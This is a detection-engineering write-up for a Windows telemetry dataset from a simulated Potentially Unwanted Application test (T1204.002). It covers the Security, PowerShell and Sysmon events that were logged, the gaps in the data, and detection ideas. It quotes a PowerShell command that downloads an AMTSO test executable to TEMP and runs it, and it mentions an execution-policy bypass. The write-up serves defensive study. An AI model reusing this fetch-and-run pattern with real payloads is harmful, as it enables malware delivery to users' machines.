# T1204.002-8: Malicious File — Potentially Unwanted Applications (PUA)

## Technique Context

T1204.002 (Malicious File) involves tricking users into executing malicious files, typically through social engineering tactics like email attachments, downloads from compromised websites, or files disguised as legitimate software. This test specifically focuses on Potentially Unwanted Applications (PUA) — software that may not be overtly malicious but exhibits unwanted behaviors like adware, browser hijacking, or data collection. PUAs often use deceptive distribution methods and are a common vector for initial access. Detection engineers focus on identifying suspicious download patterns, unsigned or suspicious executables, and behavioral analysis of downloaded files.

## What This Dataset Contains

This dataset captures a PowerShell-based download and execution of a test PUA from the AMTSO (Anti-Malware Testing Standards Organization) repository. The key telemetry includes:

**Process Creation Chain**: Security 4688 shows the parent PowerShell process (PID 29860) spawning a child PowerShell process (PID 11480) with the command line `"powershell.exe" & {Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe & "$env:TEMP/PotentiallyUnwanted.exe"}`.

**PowerShell Activity**: PowerShell EID 4103 captures the `Invoke-WebRequest` command with parameters showing the download URL `http://amtso.eicar.org/PotentiallyUnwanted.exe` and output file `C:\Windows\TEMP/PotentiallyUnwanted.exe`. PowerShell EID 4104 script blocks show the actual command execution.

**File Operations**: Sysmon EID 11 shows file creation at `C:\Windows\Temp\PotentiallyUnwanted.exe` by the PowerShell process. Sysmon EID 29 provides file hashes: `SHA256=42D6581DD0A2BA9BEC6A40C5B7C85870A8019D7347C9130D24752EC5865F0732`.

**Network Activity Preparation**: Sysmon EID 7 shows `urlmon.dll` loading into PowerShell processes, indicating preparation for web requests.

**Windows Defender Integration**: Multiple Sysmon EID 7 events show loading of Defender DLLs (`MpOAV.dll`, `MpClient.dll`) into PowerShell processes, indicating real-time scanning activity.

## What This Dataset Does Not Contain

The dataset lacks critical execution telemetry that would normally follow file download. There are no Sysmon EID 1 process creation events for `PotentiallyUnwanted.exe`, no network connection events (Sysmon EID 3), and no DNS queries (Sysmon EID 22). This suggests Windows Defender likely blocked the downloaded file from executing, which is supported by the presence of Defender DLL loads but absence of execution artifacts. The dataset also lacks any Windows Defender operational logs that would show the detection and blocking action. Process termination events in Security logs show normal exit codes (0x0), indicating clean shutdowns rather than forced termination by security software.

## Assessment

This dataset provides excellent telemetry for detecting malicious file downloads via PowerShell but limited visibility into post-download execution attempts. The combination of Security 4688 command-line logging, PowerShell operational logs, and Sysmon file creation events creates a strong detection foundation for the download phase. However, the apparent blocking by Defender means this dataset is better suited for building detections around the initial download vector rather than post-execution behaviors. The presence of AMTSO test infrastructure makes this ideal for detection engineering without real malware risks.

## Detection Opportunities Present in This Data

1. **PowerShell Web Download Detection**: Alert on PowerShell `Invoke-WebRequest` commands downloading executable files, especially to temp directories
2. **Suspicious Domain Detection**: Flag downloads from known test domains like `amtso.eicar.org` or similar security testing infrastructure
3. **Command-line Chaining**: Detect PowerShell commands that download files and immediately attempt execution in the same script block
4. **File Creation in Temp**: Monitor Sysmon EID 11 for executable file creation in `%TEMP%` or `%TMP%` directories by PowerShell processes
5. **Process Access Patterns**: Detect Sysmon EID 10 process access events where PowerShell accesses newly created child processes with full access rights (0x1FFFFF)
6. **Unsigned Executable Downloads**: Correlate file creation events with file hash analysis to identify unsigned or suspicious executables
7. **PowerShell Execution Policy Bypass**: Monitor for `Set-ExecutionPolicy -Scope Process -Force -ExecutionPolicy Bypass` preceding download activities
8. **Parent-Child Process Anomalies**: Alert on PowerShell processes spawning other PowerShell instances with embedded download commands
